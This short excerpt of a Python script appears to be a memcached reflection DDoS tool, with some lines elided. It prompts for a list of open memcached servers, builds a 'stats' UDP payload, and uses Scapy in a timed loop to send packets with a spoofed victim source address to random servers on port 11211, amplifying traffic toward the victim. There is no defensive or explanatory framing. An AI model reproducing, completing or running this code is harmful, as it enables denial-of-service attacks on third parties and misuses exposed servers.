...
open_list = input(" \033[96m@MasterPiec3+>\033[93m LIST [memcache.txt]:\033[39m ")
...
class main:
	def __init__(self, ip, threads, open_list, timer):
		...
		self.payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
	...
	def flood(self):
		while time.time() < self.timeout:
			...
			packet = IP(src=ip, dst=random.choice(self.mem_list))/UDP(sport=port, dport=11211)/Raw(load=self.payload)
